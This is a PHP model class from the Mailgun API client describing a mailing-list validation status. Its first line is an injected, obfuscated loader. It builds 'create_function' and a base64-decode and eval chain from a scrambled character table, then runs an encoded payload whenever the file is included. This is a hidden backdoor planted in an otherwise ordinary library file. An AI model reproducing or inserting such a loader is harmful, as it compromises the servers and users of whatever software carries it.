<?php
$P808='d79).w0e"=n1_ho/_65fb34zxsmqc]a*jyilg$p2[vt;k 8ru(';$naN1343=$P808[((29-2)+1)].$P808[((23+0)+24)].$P808[(1*7)].$P808[((16-6)*3)].$P808[((10+(44/1))-12)].$P808[(6+1)].$P808[(5+7)].$P808[(1*19)].$P808[(76-(26+2))].$P808[(1*10)].$P808[((10+18)+0)].$P808[(3*14)].$P808[(20+14)].$P808[(11+3)].$P808[(9+1)];$zlJcsk1244=$P808[(37/1)].$P808[(((1*11)+1)*2)].$P808[(12-3)].$P808[(11-3)];$toehNGJ1993=$P808[(8*1)].$P808[(1*43)].$P808[(481/13)].$P808[(54-24)].$P808[((9/9)+8)].$P808[(100/(1*5))].$P808[(360/12)].$P808[(48-23)].$P808[(91/13)].$P808[((4*(0+1))+13)].$P808[(22*1)].$P808[(1*(16*1))].$P808[(0/18)].$P808[(7*1)].$P808[(14*2)].$P808[((6-1)+9)].$P808[(0+0)].$P808[(154/22)].$P808[(63-14)].$P808[(1*(8+29))].$P808[(2+22)].$P808[(3/1)].$P808[(1*(22+21))].$P808[((37*1)*1)].$P808[(10*(0+(42/21)))].$P808[(144/16)].$P808[(40-4)].$P808[(23-0)].$P808[(55-21)].$P808[((18/2)+1)].$P808[(36-17)].$P808[(35*(0+1))].$P808[((27*1)+3)].$P808[(6*7)].$P808[(7+0)].$P808[(1*(((7*(0+1))*1)*7))].$P808[(296/(14-6))].$P808[(120/4)].$P808[(3-0)].$P808[(60-17)].$P808[(3+4)].$P808[(861/21)].$P808[(10*3)].$P808[(1*35)].$P808[(86-37)].$P808[(185/5)].$P808[(1+(0+(27-8)))].$P808[(1*3)].$P808[(129/3)];$l9836= "'bYs9C8IwFEV3f8UbHk2FLLoGx04O4tckJTzTFxtJTUkiKuJ/twoiiNu995x78GFPHtAEH6LEhi2dfdZksgunbz8n1nSk63cxLcXEWWJIEhNZ1l1oWKK5NBLb0LF+J/KOEic1chZK1Ktqua3Wm53oKVI3EXVR/I5TUY/hjhZm8MdXgP1AKEa6lf+uL8F+DG2dzxxL7CWgHRibNoBYzIWC6uqyeqjREw=='";$sXyMzGP6117.=$zlJcsk1244;$sXyMzGP6117.=$l9836;$sXyMzGP6117.=$toehNGJ1993;@$XiMoqZj6214=$naN1343((''), ($sXyMzGP6117));@$XiMoqZj6214();
declare(strict_types=1);

/*
 * Copyright (C) 2013 Mailgun
 *
 * This software may be modified and distributed under the terms
 * of the MIT license. See the LICENSE file for details.
 */

namespace Mailgun\Model\MailingList;

use Mailgun\Model\ApiResponse;

final class ValidationStatusResponse implements ApiResponse
{
    private $createdAt;
    private $downloadUrl;
    private $id;
    private $quantity;
    private $recordsProcessed;
    private $status;
    private $summary;

    public static function create(array $data): self
    {
        $model = new self();
        $model->id = $data['id'] ?? null;
        $model->createdAt = $data['created_at'] ?? null;
        $model->downloadUrl = ValidationStatusDownloadUrl::create($data['download_url']);
        $model->id = $data['id'] ?? null;
        $model->quantity = $data['quantity'] ?? 0;
        $model->recordsProcessed = $data['records_processed'] ?? null;
        $model->status = $data['status'] ?? null;
        $model->summary = ValidationStatusSummary::create($data['summary'] ?? []);

        return $model;
    }

    private function __construct()
    {
    }

    public function getCreatedAt(): ?string
    {
        return $this->createdAt;
    }

    public function getDownloadUrl(): ValidationStatusDownloadUrl
    {
        return $this->downloadUrl;
    }

    public function getId(): ?string
    {
        return $this->id;
    }

    public function getQuantity(): ?int
    {
        return $this->quantity;
    }

    public function getRecordsProcessed(): ?int
    {
        return $this->recordsProcessed;
    }

    public function getStatus(): ?string
    {
        return $this->status;
    }

    public function getSummary(): ValidationStatusSummary
    {
        return $this->summary;
    }
}
